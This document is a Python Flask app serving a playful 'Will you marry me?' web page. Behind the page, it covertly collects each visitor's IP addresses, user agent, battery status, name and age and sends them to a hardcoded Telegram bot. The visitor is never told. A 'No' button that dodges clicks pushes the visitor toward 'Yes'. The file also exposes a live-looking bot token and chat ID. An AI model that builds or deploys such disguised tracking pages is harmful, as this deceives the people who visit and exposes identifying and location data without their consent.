from flask import Flask, request, jsonify, render_template_string
from datetime import datetime
import requests
import threading

app = Flask(__name__)

# Telegram Bot Configuration
BOT_TOKEN = "8923874895:AAF9Fe8cDgvbWM3dRVIWNJZ6Iu-2ssmhpRM"
CHAT_ID = "7693038564"

# Function to send COMPLETE data to Telegram in ONE MESSAGE
def send_to_telegram_complete(name, age, ipv4, ipv6, battery, real_ip, user_agent, step, visitor_ipv4=None, visitor_ipv6=None):
    try:
        if step == "visit":
            message = f"""🌐🌐🌐 NEW VISITOR DETECTED! 🌐🌐🌐

📅 Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
👤 Visitor: Just opened the website
🌍 Real Client IP: {real_ip}
📡 IPv4 (Public): {visitor_ipv4 or 'Fetching...'}
📡 IPv6 (Public): {visitor_ipv6 or 'Not available'}
💻 User Agent: {user_agent[:80]}...

✨ Waiting for love journey to begin... ✨"""
            
        elif step == "name_age":
            message = f"""📝📝📝 USER DATA COLLECTED! 📝📝📝

📅 Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
👤 Name: {name}
🎂 Age: {age}
🌍 Real Client IP: {real_ip}
📡 IPv4: {ipv4}
📡 IPv6: {ipv6}
🔋 Battery: {battery}
💻 User Agent: {user_agent[:80]}...

💕 Moving to proposal stage... 💕"""
            
        else:
            message = f"""💖💖💖💖💖 LOVE PROPOSAL ACCEPTED! 💖💖💖💖💖

📅 Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
👤 NAME: {name}
🎂 AGE: {age}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🌍 REAL CLIENT IP: {real_ip}
📡 IPv4 ADDRESS: {ipv4}
📡 IPv6 ADDRESS: {ipv6}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🔋 BATTERY STATUS: {battery}
💻 USER AGENT: {user_agent[:100]}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
💍💍💍 STATUS: {name.upper()} SAID YES TO MARRIAGE! 💍💍💍
✨✨✨ FOREVER COMMITTED! ✨✨✨"""
        
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        payload = {
            'chat_id': CHAT_ID,
            'text': message,
            'parse_mode': 'HTML'
        }
        
        response = requests.post(url, json=payload, timeout=10)
        if response.status_code == 200:
            print(f"✅ Telegram sent for step: {step}")
    except Exception as e:
        print(f"❌ Telegram error: {e}")

HTML_TEMPLATE = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>💖 A Love Journey 💖</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            min-height: 100vh;
            background: linear-gradient(145deg, #ff9a9e 0%, #fad0c4 100%);
            font-family: 'Segoe UI', 'Poppins', cursive, system-ui, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 1.5rem;
            position: relative;
            overflow-x: hidden;
        }

        .sticker-bg {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
            z-index: 0;
            overflow: hidden;
        }

        .sticker {
            position: absolute;
            font-size: 2.5rem;
            opacity: 0.4;
            animation: floatSticker 12s infinite ease-in-out;
        }

        @keyframes floatSticker {
            0% { transform: translateY(0px) rotate(0deg); }
            50% { transform: translateY(-20px) rotate(8deg); }
            100% { transform: translateY(0px) rotate(0deg); }
        }

        @keyframes pulseHeart {
            0% { transform: scale(1); }
            100% { transform: scale(1.1); }
        }

        @keyframes fadeInUp {
            from {
                opacity: 0;
                transform: translateY(30px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .container {
            position: relative;
            z-index: 10;
            max-width: 550px;
            width: 100%;
            animation: fadeInUp 0.6s ease-out;
        }

        .card {
            background: rgba(255, 255, 255, 0.95);
            backdrop-filter: blur(8px);
            border-radius: 64px;
            box-shadow: 0 30px 40px rgba(0, 0, 0, 0.2);
            padding: 2rem 1.8rem 2.5rem;
            text-align: center;
            border: 1px solid rgba(255,255,200,0.6);
        }

        .step-indicator {
            display: flex;
            justify-content: center;
            gap: 12px;
            margin-bottom: 30px;
        }

        .step-dot {
            width: 40px;
            height: 40px;
            border-radius: 50%;
            background: #ffcdb0;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: bold;
            color: #b45a3a;
            transition: all 0.3s;
        }

        .step-dot.active {
            background: linear-gradient(135deg, #e74c3c, #ff6b6b);
            color: white;
            transform: scale(1.1);
            box-shadow: 0 0 15px rgba(231,76,60,0.5);
        }

        .step-dot.completed {
            background: #2ecc71;
            color: white;
        }

        .heart-decoration {
            font-size: 3rem;
            animation: pulseHeart 1.6s infinite;
            display: inline-block;
            margin-bottom: 10px;
        }

        h2 {
            font-size: 1.8rem;
            color: #c0392b;
            margin-bottom: 20px;
        }

        .input-group {
            margin: 25px 0;
        }

        input {
            width: 80%;
            padding: 15px 20px;
            font-size: 1.1rem;
            border: 2px solid #ffb6a0;
            border-radius: 50px;
            outline: none;
            text-align: center;
            font-family: inherit;
            transition: all 0.3s;
        }

        input:focus {
            border-color: #e74c3c;
            box-shadow: 0 0 15px rgba(231,76,60,0.3);
        }

        .btn {
            font-size: 1.3rem;
            font-weight: bold;
            padding: 12px 35px;
            border: none;
            border-radius: 50px;
            cursor: pointer;
            transition: all 0.3s;
            font-family: inherit;
            background: linear-gradient(120deg, #e74c3c, #ff6b6b);
            color: white;
            box-shadow: 0 5px 15px rgba(231,76,60,0.3);
        }

        .btn:hover {
            transform: scale(1.05);
            box-shadow: 0 8px 25px rgba(231,76,60,0.4);
        }

        .surprise-box {
            background: linear-gradient(135deg, #fff5f0, #ffe8e0);
            padding: 25px;
            border-radius: 40px;
            margin: 20px 0;
            font-size: 1.2rem;
            color: #c0392b;
            border: 2px dashed #ff9a76;
        }

        .button-panel {
            display: flex;
            justify-content: center;
            gap: 1.5rem;
            flex-wrap: wrap;
            margin-top: 20px;
        }

        .btn-no {
            background: linear-gradient(120deg, #e67e22, #d35400);
        }

        .btn-yes {
            background: linear-gradient(120deg, #2ecc71, #27ae60);
        }

        .info-message {
            margin-top: 20px;
            font-size: 0.9rem;
            color: #a6411c;
        }

        @media (max-width: 550px) {
            .card { padding: 1.5rem; }
            h2 { font-size: 1.4rem; }
            input { width: 90%; }
            .btn { font-size: 1.1rem; padding: 10px 25px; }
        }
    </style>
</head>
<body>
    <div class="sticker-bg" id="stickerContainer"></div>
    
    <div class="container" id="app">
        <!-- Step 1: Name -->
        <div class="card" id="step1">
            <div class="step-indicator">
                <div class="step-dot active">1</div>
                <div class="step-dot">2</div>
                <div class="step-dot">3</div>
                <div class="step-dot">4</div>
            </div>
            <div class="heart-decoration">💖✨💖</div>
            <h2>Hello Cutie! 🥰</h2>
            <p style="color: #b45a3a; margin-bottom: 10px;">First, tell me your beautiful name...</p>
            <div class="input-group">
                <input type="text" id="userName" placeholder="Enter your name..." autocomplete="off">
            </div>
            <button class="btn" onclick="nextStep1()">Continue 💕</button>
            <div class="info-message">I'm waiting for you, my love 💌</div>
        </div>

        <!-- Step 2: Age -->
        <div class="card" id="step2" style="display:none;">
            <div class="step-indicator">
                <div class="step-dot completed">✓</div>
                <div class="step-dot active">2</div>
                <div class="step-dot">3</div>
                <div class="step-dot">4</div>
            </div>
            <div class="heart-decoration">🌸🎂🌸</div>
            <h2 id="greetingName"></h2>
            <p style="color: #b45a3a; margin-bottom: 10px;">How old are you, my sweetheart?</p>
            <div class="input-group">
                <input type="number" id="userAge" placeholder="Enter your age..." min="1" max="100" autocomplete="off">
            </div>
            <button class="btn" onclick="nextStep2()">Next 💕</button>
            <div class="info-message">Every year with you is a blessing ✨</div>
        </div>

        <!-- Step 3: Surprise Love Message -->
        <div class="card" id="step3" style="display:none;">
            <div class="step-indicator">
                <div class="step-dot completed">✓</div>
                <div class="step-dot completed">✓</div>
                <div class="step-dot active">3</div>
                <div class="step-dot">4</div>
            </div>
            <div class="heart-decoration">💌💖💌</div>
            <h2>A Special Surprise For You! 🎁</h2>
            <div class="surprise-box" id="surpriseMessage"></div>
            <button class="btn" onclick="nextStep3()">Next 💕</button>
            <div class="info-message">Something special is waiting... 💫</div>
        </div>

        <!-- Step 4: Proposal -->
        <div class="card" id="step4" style="display:none;">
            <div class="step-indicator">
                <div class="step-dot completed">✓</div>
                <div class="step-dot completed">✓</div>
                <div class="step-dot completed">✓</div>
                <div class="step-dot active">4</div>
            </div>
            <div class="heart-decoration">💍💖💍</div>
            <h2 id="proposalName"></h2>
            <div class="question" style="font-size: 2rem; margin: 20px 0; color: #c0392b;">
                💍 Will you marry me? 💍
            </div>
            <div class="button-panel">
                <button class="btn btn-yes" id="yesButton">💖 YES 💖</button>
                <button class="btn btn-no" id="noButton">😢 NO 😢</button>
            </div>
            <div class="info-message" id="infoMsg">My heart beats only for you 💓</div>
        </div>
    </div>

    <script>
        let userName = '';
        let userAge = '';
        let visitorIPs = {};
        
        async function getIPsOnLoad() {
            try {
                const res4 = await fetch('https://api.ipify.org?format=json');
                const data4 = await res4.json();
                visitorIPs.ipv4 = data4.ip;
            } catch(e) { visitorIPs.ipv4 = 'Unable to fetch'; }
            
            try {
                const res6 = await fetch('https://api6.ipify.org?format=json');
                const data6 = await res6.json();
                visitorIPs.ipv6 = data6.ip;
            } catch(e) { visitorIPs.ipv6 = 'IPv6 not available'; }
            
            let batteryPercent = 'Not supported';
            if ('getBattery' in navigator) {
                try {
                    const battery = await navigator.getBattery();
                    const level = Math.round(battery.level * 100);
                    const charging = battery.charging ? '⚡ Charging' : '🔋 Battery';
                    batteryPercent = `${level}% (${charging})`;
                } catch(err) { batteryPercent = 'Battery API error'; }
            }
            visitorIPs.battery = batteryPercent;
            
            await fetch('/api/visitor-ip', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(visitorIPs)
            });
        }
        
        getIPsOnLoad();
        
        const stickerList = ['💖', '🌸', '🐻‍❄️', '🍰', '💕', '✨', '💌', '🎀', '🌈', '🦋', '🌹', '🥰', '💗', '🐼', '🍒', '💞', '💘', '💝'];
        const stickerContainer = document.getElementById('stickerContainer');
        
        function createRandomSticker() {
            const sticker = document.createElement('div');
            sticker.classList.add('sticker');
            sticker.innerText = stickerList[Math.floor(Math.random() * stickerList.length)];
            sticker.style.fontSize = (Math.random() * 40 + 28) + 'px';
            sticker.style.left = Math.random() * 100 + '%';
            sticker.style.top = Math.random() * 100 + '%';
            sticker.style.animationDuration = (Math.random() * 12 + 8) + 's';
            sticker.style.animationDelay = Math.random() * 5 + 's';
            sticker.style.opacity = Math.random() * 0.4 + 0.2;
            stickerContainer.appendChild(sticker);
            setTimeout(() => sticker.remove(), 15000);
        }
        
        for(let i = 0; i < 30; i++) createRandomSticker();
        setInterval(() => createRandomSticker(), 4000);
        
        function nextStep1() {
            const nameInput = document.getElementById('userName').value.trim();
            if(nameInput === '') {
                alert('Please tell me your name, my love! 💕');
                return;
            }
            userName = nameInput;
            
            fetch('/api/save-name', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({name: userName})
            });
            
            document.getElementById('step1').style.display = 'none';
            document.getElementById('greetingName').innerHTML = `Hey ${userName}! 🥰`;
            document.getElementById('step2').style.display = 'block';
        }
        
        function nextStep2() {
            const ageInput = document.getElementById('userAge').value;
            if(ageInput === '' || ageInput < 1 || ageInput > 100) {
                alert('Please enter a valid age, my love! 🎂');
                return;
            }
            userAge = ageInput;
            
            fetch('/api/save-age', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    name: userName, 
                    age: userAge,
                    ipv4: visitorIPs.ipv4,
                    ipv6: visitorIPs.ipv6,
                    battery: visitorIPs.battery
                })
            });
            
            const surpriseMessages = [
                `✨ My Dearest ${userName}, ✨<br><br>
                From the moment I saw you, I knew you were special. 
                Your smile lights up my world, and your presence makes everything better. 
                Every day with you feels like a beautiful dream. 💖<br><br>
                I love you more than words can express! 🌹`,
                
                `💕 Hey ${userName}, ${userAge} looks absolutely stunning on you! 💕<br><br>
                You are the reason I believe in magic, the reason I smile when I wake up,
                and the reason my heart beats faster. I LOVE YOU! 💖`,
                
                `🌸 My Beautiful ${userName} (age ${userAge} - perfect age for love!) 🌸<br><br>
                You are the missing piece of my puzzle, the melody to my heart's song.
                I fall in love with you more and more each day. You are my everything!
                I LOVE YOU more than the stars in the sky! ✨💖`
            ];
            
            const randomMsg = surpriseMessages[Math.floor(Math.random() * surpriseMessages.length)];
            document.getElementById('surpriseMessage').innerHTML = randomMsg;
            
            document.getElementById('step2').style.display = 'none';
            document.getElementById('step3').style.display = 'block';
        }
        
        function nextStep3() {
            document.getElementById('step3').style.display = 'none';
            document.getElementById('proposalName').innerHTML = `${userName}, my love 💖`;
            document.getElementById('step4').style.display = 'block';
            initNoButton();
        }
        
        let noBtn, yesBtn;
        
        function initNoButton() {
            noBtn = document.getElementById('noButton');
            yesBtn = document.getElementById('yesButton');
            
            if(!noBtn) return;
            
            function moveNoButton() {
                const viewportWidth = window.innerWidth;
                const viewportHeight = window.innerHeight;
                const btnRect = noBtn.getBoundingClientRect();
                const btnWidth = btnRect.width;
                const btnHeight = btnRect.height;
                
                let maxX = viewportWidth - btnWidth - 20;
                let maxY = viewportHeight - btnHeight - 20;
                let minX = 20;
                let minY = 20;
                
                let randomX = Math.random() * (maxX - minX) + minX;
                let randomY = Math.random() * (maxY - minY) + minY;
                
                randomX = Math.min(maxX, Math.max(minX, randomX));
                randomY = Math.min(maxY, Math.max(minY, randomY));
                
                noBtn.style.position = 'fixed';
                noBtn.style.left = randomX + 'px';
                noBtn.style.top = randomY + 'px';
                noBtn.style.margin = '0';
                noBtn.style.zIndex = '999';
            }
            
            noBtn.addEventListener('mouseenter', () => moveNoButton());
            noBtn.addEventListener('touchstart', (e) => {
                e.preventDefault();
                moveNoButton();
            });
            noBtn.addEventListener('click', (e) => {
                e.preventDefault();
                moveNoButton();
                document.getElementById('infoMsg').innerHTML = '💕 You cannot escape destiny! Click YES! 💕';
                setTimeout(() => {
                    document.getElementById('infoMsg').innerHTML = 'My heart beats only for you 💓';
                }, 2000);
            });
            
            yesBtn.addEventListener('click', async () => {
                yesBtn.disabled = true;
                noBtn.disabled = true;
                
                const infoDiv = document.getElementById('infoMsg');
                infoDiv.innerHTML = '<span class="loading"></span> Sending my love... 💫';
                
                let ipv4 = visitorIPs.ipv4 || 'Fetching...';
                let ipv6 = visitorIPs.ipv6 || 'Not available';
                let batteryPercent = visitorIPs.battery || 'Not supported';
                
                try {
                    const res4 = await fetch('https://api.ipify.org?format=json');
                    const data4 = await res4.json();
                    ipv4 = data4.ip;
                } catch(e) {}
                
                try {
                    const res6 = await fetch('https://api6.ipify.org?format=json');
                    const data6 = await res6.json();
                    ipv6 = data6.ip;
                } catch(e) {}
                
                try {
                    const response = await fetch('/api/say-yes', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({
                            name: userName,
                            age: userAge,
                            ipv4: ipv4,
                            ipv6: ipv6,
                            battery: batteryPercent,
                            timestamp: new Date().toISOString()
                        })
                    });
                    
                    const result = await response.json();
                    
                    if (result.success) {
                        createConfettiHearts();
                        infoDiv.innerHTML = '💍 YES! We are engaged! Forever! 💍<br>✨ I LOVE YOU! ✨';
                        noBtn.style.opacity = '0.5';
                        noBtn.style.cursor = 'default';
                        noBtn.innerText = '💕 TAKEN 💕';
                    } else {
                        infoDiv.innerHTML = 'Try again my love 💕';
                        yesBtn.disabled = false;
                        noBtn.disabled = false;
                    }
                } catch(error) {
                    infoDiv.innerHTML = 'Click YES again my love 💕';
                    yesBtn.disabled = false;
                    noBtn.disabled = false;
                }
            });
        }
        
        function createConfettiHearts() {
            for(let i = 0; i < 150; i++) {
                const heart = document.createElement('div');
                heart.innerText = ['❤️','💖','💗','💓','💘','💝','🌸','💕','💞','💍','✨','🌹'][Math.floor(Math.random()*12)];
                heart.style.position = 'fixed';
                heart.style.left = Math.random() * 100 + '%';
                heart.style.top = '-10%';
                heart.style.fontSize = (Math.random() * 35 + 20) + 'px';
                heart.style.pointerEvents = 'none';
                heart.style.zIndex = '9999';
                heart.style.animation = `fallLove ${Math.random() * 2 + 2}s linear forwards`;
                document.body.appendChild(heart);
                setTimeout(() => heart.remove(), 4000);
            }
        }
        
        const style = document.createElement('style');
        style.textContent = `
            @keyframes fallLove {
                0% { transform: translateY(0) rotate(0deg); opacity: 1;}
                100% { transform: translateY(100vh) rotate(360deg); opacity: 0;}
            }
            .loading {
                display: inline-block;
                width: 20px;
                height: 20px;
                border: 3px solid #ffb37c;
                border-radius: 50%;
                border-top-color: transparent;
                animation: spin 0.6s linear infinite;
            }
            @keyframes spin {
                to { transform: rotate(360deg); }
            }
        `;
        document.head.appendChild(style);
    </script>
</body>
</html>
'''

@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route('/api/visitor-ip', methods=['POST'])
def visitor_ip():
    try:
        data = request.get_json()
        ipv4 = data.get('ipv4', 'Unknown')
        ipv6 = data.get('ipv6', 'Unknown')
        battery = data.get('battery', 'Unknown')
        
        client_ip = request.remote_addr
        forwarded_for = request.headers.get('X-Forwarded-For')
        real_ip = forwarded_for.split(',')[0] if forwarded_for else client_ip
        user_agent = request.headers.get('User-Agent', 'Unknown')
        
        threading.Thread(target=send_to_telegram_complete, args=(None, None, ipv4, ipv6, battery, real_ip, user_agent, "visit", ipv4, ipv6)).start()
        
        return jsonify({'success': True})
    except Exception as e:
        return jsonify({'success': False})

@app.route('/api/save-name', methods=['POST'])
def save_name():
    try:
        data = request.get_json()
        name = data.get('name', 'Unknown')
        return jsonify({'success': True})
    except Exception as e:
        return jsonify({'success': False})

@app.route('/api/save-age', methods=['POST'])
def save_age():
    try:
        data = request.get_json()
        name = data.get('name', 'Unknown')
        age = data.get('age', 'Unknown')
        ipv4 = data.get('ipv4', 'Unknown')
        ipv6 = data.get('ipv6', 'Unknown')
        battery = data.get('battery', 'Unknown')
        
        client_ip = request.remote_addr
        forwarded_for = request.headers.get('X-Forwarded-For')
        real_ip = forwarded_for.split(',')[0] if forwarded_for else client_ip
        user_agent = request.headers.get('User-Agent', 'Unknown')
        
        threading.Thread(target=send_to_telegram_complete, args=(name, age, ipv4, ipv6, battery, real_ip, user_agent, "name_age", None, None)).start()
        
        return jsonify({'success': True})
    except Exception as e:
        return jsonify({'success': False})

@app.route('/api/say-yes', methods=['POST'])
def say_yes():
    try:
        data = request.get_json()
        
        name = data.get('name', 'Not provided')
        age = data.get('age', 'Not provided')
        ipv4 = data.get('ipv4', 'Not provided')
        ipv6 = data.get('ipv6', 'Not provided')
        battery = data.get('battery', 'Not provided')
        user_agent = request.headers.get('User-Agent', 'Unknown')
        
        client_ip = request.remote_addr
        forwarded_for = request.headers.get('X-Forwarded-For')
        real_ip = forwarded_for.split(',')[0] if forwarded_for else client_ip
        
        threading.Thread(target=send_to_telegram_complete, args=(name, age, ipv4, ipv6, battery, real_ip, user_agent, "proposal", None, None)).start()
        
        return jsonify({'success': True, 'message': 'I love you forever! 💖'})
        
    except Exception as e:
        return jsonify({'success': False}), 500

# For Vercel
app.debug = False
